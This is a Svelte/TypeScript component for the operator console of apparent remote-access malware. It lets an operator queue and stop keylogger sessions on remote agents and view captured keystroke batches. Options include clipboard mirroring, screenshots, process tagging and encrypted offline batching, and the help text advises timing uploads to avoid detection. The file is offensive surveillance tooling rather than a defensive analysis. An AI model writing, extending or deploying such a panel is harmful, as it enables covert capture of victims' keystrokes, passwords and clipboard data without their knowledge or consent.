<script lang="ts">
	import { onMount } from 'svelte';
	import { Button } from '$lib/components/ui/button/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardFooter,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import WorkspaceHeroHeader from '$lib/components/workspace/WorkspaceHeroHeader.svelte';
	import { getClientTool } from '$lib/data/client-tools';
	import type { Client } from '$lib/data/clients';
	import { appendWorkspaceLog, createWorkspaceLogEntry } from '$lib/workspace/utils';
	import type { WorkspaceLogEntry } from '$lib/workspace/types';
	import type {
		KeyloggerSessionResponse,
		KeyloggerStartConfig,
		KeyloggerSessionState,
		KeyloggerTelemetryState,
		KeyloggerTelemetryBatch
	} from '$lib/types/keylogger';

	type KeyloggerMode = 'standard' | 'offline';

	const toolMap = {
		standard: 'keylogger-standard',
		offline: 'keylogger-offline'
	} as const;

	const modeCopy: Record<
		KeyloggerMode,
		{ subtitle: string; cadenceLabel: string; bufferLabel: string }
	> = {
		standard: {
			subtitle: 'Stream keystrokes live into the operator console.',
			cadenceLabel: 'Stream cadence (ms)',
			bufferLabel: 'In-memory buffer (events)'
		},
		offline: {
			subtitle: 'Persist keystrokes locally and upload on a schedule.',
			cadenceLabel: 'Batch interval (minutes)',
			bufferLabel: 'Disk retention limit (events)'
		}
	};

	const props = $props<{
		client: Client;
		mode: KeyloggerMode;
		onLogChange?: (log: WorkspaceLogEntry[]) => void;
	}>();
	const client = props.client;
	const mode = props.mode;

	const tool = getClientTool(toolMap[mode as keyof typeof toolMap]);

	let cadence = $state(mode === 'offline' ? 15 : 250);
	let bufferSize = $state(mode === 'offline' ? 5000 : 300);
	let includeWindowTitles = $state(mode !== 'offline');
	let includeClipboard = $state(false);
	let encryptAtRest = $state(true);
	let redactSecrets = $state(true);
	let emitProcessNames = $state(false);
	let includeScreenshots = $state(false);
	let log = $state<WorkspaceLogEntry[]>([]);

	$effect(() => {
		props.onLogChange?.(log);
	});
	let session = $state<KeyloggerSessionState | null>(null);
	let telemetryState = $state<KeyloggerTelemetryState>({ batches: [], totalEvents: 0 });
	let queuePending = $state(false);
	let stopPending = $state(false);
	let lastError = $state<string | null>(null);

	function describePlan(): string {
		const segments = [
			`${mode} mode`,
			`${mode === 'offline' ? cadence : `${cadence}ms`} cadence`,
			`${bufferSize} events`,
			includeWindowTitles ? 'window titles' : 'window IDs only',
			encryptAtRest ? 'encrypted' : 'plain text',
			redactSecrets ? 'redaction on' : 'redaction off'
		];
		if (includeClipboard) segments.push('clipboard mirrored');
		if (emitProcessNames) segments.push('process tags');
		if (includeScreenshots) segments.push('screen snippets');
		return segments.join(' · ');
	}

	function append(status: WorkspaceLogEntry['status']) {
		log = appendWorkspaceLog(
			log,
			createWorkspaceLogEntry('Keylogger configuration staged', describePlan(), status)
		);
	}

	function applySessionConfig(state: KeyloggerSessionState | null) {
		if (!state?.config) {
			return;
		}
		const config = state.config;
		if (mode === 'offline') {
			const minutes = Math.max(
				1,
				Math.round((config.batchIntervalMs ?? cadence * 60_000) / 60_000)
			);
			cadence = minutes;
		} else if (typeof config.cadenceMs === 'number') {
			cadence = config.cadenceMs;
		}
		if (typeof config.bufferSize === 'number') {
			bufferSize = config.bufferSize;
		}
		if (typeof config.includeWindowTitles === 'boolean') {
			includeWindowTitles = config.includeWindowTitles;
		}
		if (typeof config.includeClipboard === 'boolean') {
			includeClipboard = config.includeClipboard;
		}
		if (typeof config.encryptAtRest === 'boolean') {
			encryptAtRest = config.encryptAtRest;
		}
		if (typeof config.redactSecrets === 'boolean') {
			redactSecrets = config.redactSecrets;
		}
		if (typeof config.emitProcessNames === 'boolean') {
			emitProcessNames = config.emitProcessNames;
		}
		if (typeof config.includeScreenshots === 'boolean') {
			includeScreenshots = config.includeScreenshots;
		}
	}

	async function loadState() {
		try {
			const response = await fetch(`/api/agents/${client.id}/keylogger`);
			if (!response.ok) {
				return;
			}
			const state = (await response.json()) as KeyloggerSessionResponse;
			session = state.session;
			telemetryState = state.telemetry;
			applySessionConfig(state.session ?? null);
		} catch (err) {
			console.warn('Failed to load keylogger state', err);
		}
	}

	onMount(() => {
		void loadState();
	});

	function buildConfig(): KeyloggerStartConfig {
		const cadenceValue = Number(cadence);
		const bufferValue = Number(bufferSize);
		const config: KeyloggerStartConfig = {
			mode,
			bufferSize: Number.isFinite(bufferValue) ? bufferValue : undefined,
			includeWindowTitles,
			includeClipboard,
			emitProcessNames,
			includeScreenshots,
			encryptAtRest,
			redactSecrets
		};
		if (mode === 'offline') {
			const intervalMs = Number.isFinite(cadenceValue)
				? Math.max(1, cadenceValue) * 60_000
				: undefined;
			config.batchIntervalMs = intervalMs;
		} else {
			config.cadenceMs = Number.isFinite(cadenceValue) ? Math.max(25, cadenceValue) : undefined;
		}
		return config;
	}

	async function queueKeylogger() {
		if (queuePending) {
			return;
		}
		queuePending = true;
		lastError = null;
		try {
			const response = await fetch(`/api/agents/${client.id}/keylogger/session`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ config: buildConfig() })
			});

			if (!response.ok) {
				const message = (await response.text())?.trim();
				lastError = message || 'Failed to queue keylogger collection';
				append('failed');
				return;
			}

			const state = (await response.json()) as KeyloggerSessionResponse;
			session = state.session;
			telemetryState = state.telemetry;
			applySessionConfig(state.session ?? null);
			append('queued');
		} catch (err) {
			lastError = err instanceof Error ? err.message : 'Failed to queue keylogger collection';
			append('failed');
		} finally {
			queuePending = false;
		}
	}

	async function stopKeylogger() {
		if (stopPending) {
			return;
		}
		stopPending = true;
		lastError = null;
		try {
			const response = await fetch(`/api/agents/${client.id}/keylogger/session`, {
				method: 'DELETE',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ sessionId: session?.sessionId })
			});

			if (!response.ok) {
				const message = (await response.text())?.trim();
				lastError = message || 'Failed to stop keylogger session';
				append('failed');
				return;
			}

			const state = (await response.json()) as KeyloggerSessionResponse;
			session = state.session;
			telemetryState = state.telemetry;
			append('complete');
		} catch (err) {
			lastError = err instanceof Error ? err.message : 'Failed to stop keylogger session';
			append('failed');
		} finally {
			stopPending = false;
		}
	}

	function formatTimestamp(value?: string | null): string {
		if (!value) {
			return '—';
		}
		try {
			return new Date(value).toLocaleString();
		} catch {
			return value;
		}
	}

	const copy = modeCopy[mode as KeyloggerMode];

	const metadata = $derived(() => [
		{
			label: 'Mode',
			value: mode,
			hint: copy.subtitle
		},
		{
			label: 'Encryption',
			value: encryptAtRest ? 'Enabled' : 'Disabled'
		},
		{
			label: 'Session',
			value: session ? (session.active ? 'Active' : 'Stopped') : 'Not started'
		}
	]) as unknown as { label: string; value: string; hint?: string }[];

	const watchers = [
		{ id: 'foreground', description: 'Track active window focus changes' },
		{ id: 'keyboard', description: 'Hook low level keyboard events' },
		{ id: 'clipboard', description: 'Mirror clipboard text mutations' }
	] as const;

	const latestBatches = $derived(() =>
		telemetryState.batches.slice(0, 5)
	) as unknown as KeyloggerTelemetryBatch[];
</script>

<div class="space-y-6">
	<WorkspaceHeroHeader {client} {tool} subtitle={copy.subtitle} {metadata} />

	{#if lastError}
		<Card class="border-destructive/60">
			<CardHeader>
				<CardTitle class="text-base text-destructive">Keylogger command failed</CardTitle>
				<CardDescription class="text-destructive/80">{lastError}</CardDescription>
			</CardHeader>
		</Card>
	{/if}

	<Card>
		<CardHeader>
			<CardTitle class="text-base">Collection settings</CardTitle>
			<CardDescription
				>Adjust cadence, buffers, and telemetry captured alongside keystrokes.</CardDescription
			>
		</CardHeader>
		<CardContent class="space-y-6">
			<div class="grid gap-4 md:grid-cols-2">
				<div class="grid gap-2">
					<Label for={`keylogger-cadence-${mode}`}>{copy.cadenceLabel}</Label>
					<Input
						id={`keylogger-cadence-${mode}`}
						type="number"
						min={mode === 'offline' ? 5 : 25}
						step={mode === 'offline' ? 5 : 25}
						bind:value={cadence}
					/>
				</div>
				<div class="grid gap-2">
					<Label for={`keylogger-buffer-${mode}`}>{copy.bufferLabel}</Label>
					<Input
						id={`keylogger-buffer-${mode}`}
						type="number"
						min={50}
						step={50}
						bind:value={bufferSize}
					/>
				</div>
			</div>

			<div class="grid gap-4 md:grid-cols-2">
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Capture window context</p>
						<p class="text-xs text-muted-foreground">Adds active window title metadata</p>
					</div>
					<Switch bind:checked={includeWindowTitles} />
				</label>
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Encrypt at rest</p>
						<p class="text-xs text-muted-foreground">Store batches with AES-GCM before upload</p>
					</div>
					<Switch bind:checked={encryptAtRest} />
				</label>
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Secret redaction</p>
						<p class="text-xs text-muted-foreground">Mask credentials and card-like patterns</p>
					</div>
					<Switch bind:checked={redactSecrets} />
				</label>
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Clipboard mirroring</p>
						<p class="text-xs text-muted-foreground">Sync clipboard alongside keystrokes</p>
					</div>
					<Switch bind:checked={includeClipboard} />
				</label>
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Tag processes</p>
						<p class="text-xs text-muted-foreground">Include owning process metadata</p>
					</div>
					<Switch bind:checked={emitProcessNames} />
				</label>
				{#if mode !== 'offline'}
					<label
						class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
					>
						<div>
							<p class="text-sm font-medium text-foreground">Screenshot hints</p>
							<p class="text-xs text-muted-foreground">Capture mini frames around spikes</p>
						</div>
						<Switch bind:checked={includeScreenshots} />
					</label>
				{/if}
			</div>
		</CardContent>
		<CardFooter class="flex flex-wrap gap-3">
			<Button type="button" variant="outline" onclick={() => append('draft')}>Save draft</Button>
			<Button type="button" onclick={queueKeylogger} disabled={queuePending}>
				{queuePending ? 'Queuing…' : 'Queue collection'}
			</Button>
			<Button
				type="button"
				variant="secondary"
				onclick={stopKeylogger}
				disabled={stopPending || !session}
			>
				{stopPending ? 'Stopping…' : 'Stop collection'}
			</Button>
		</CardFooter>
	</Card>

	{#if session}
		<Card>
			<CardHeader>
				<CardTitle class="text-base">Session overview</CardTitle>
				<CardDescription>
					Session {session.sessionId} — {session.active ? 'active' : 'stopped'} since
					{` ${formatTimestamp(session.startedAt)}`}
				</CardDescription>
			</CardHeader>
			<CardContent class="grid gap-2 text-sm text-muted-foreground">
				<div class="flex justify-between gap-3">
					<span>Total events captured</span>
					<span class="font-medium text-foreground">{session.totalEvents}</span>
				</div>
				<div class="flex justify-between gap-3">
					<span>Last captured</span>
					<span class="font-medium text-foreground">{formatTimestamp(session.lastCapturedAt)}</span>
				</div>
			</CardContent>
		</Card>
	{/if}

	<Card class="border-dashed">
		<CardHeader>
			<CardTitle class="text-base">Signal watchers</CardTitle>
			<CardDescription
				>Modules that will emit telemetry once the keylogger activates.</CardDescription
			>
		</CardHeader>
		<CardContent class="space-y-2 text-sm text-muted-foreground">
			<ul class="list-disc space-y-1 pl-5">
				{#each watchers as watcher (watcher.id)}
					<li>{watcher.description}</li>
				{/each}
			</ul>
			{#if mode === 'offline'}
				<p class="text-xs text-muted-foreground">
					Offline mode batches events on disk. Schedule upload windows around low-activity periods
					to avoid detection.
				</p>
			{/if}
		</CardContent>
	</Card>

	{#if latestBatches.length > 0}
		<Card>
			<CardHeader>
				<CardTitle class="text-base">Recent telemetry</CardTitle>
				<CardDescription>
					Last {latestBatches.length} batches · {telemetryState.totalEvents} events total
				</CardDescription>
			</CardHeader>
			<CardContent class="space-y-2 text-sm text-muted-foreground">
				<ul class="space-y-2">
					{#each latestBatches as batch (batch.batchId)}
						<li
							class="flex items-start justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
						>
							<div>
								<p class="font-medium text-foreground">{batch.events.length} events</p>
								<p>{formatTimestamp(batch.capturedAt)}</p>
							</div>
							<span class="text-xs text-muted-foreground">Batch {batch.batchId}</span>
						</li>
					{/each}
				</ul>
			</CardContent>
		</Card>
	{/if}
</div>
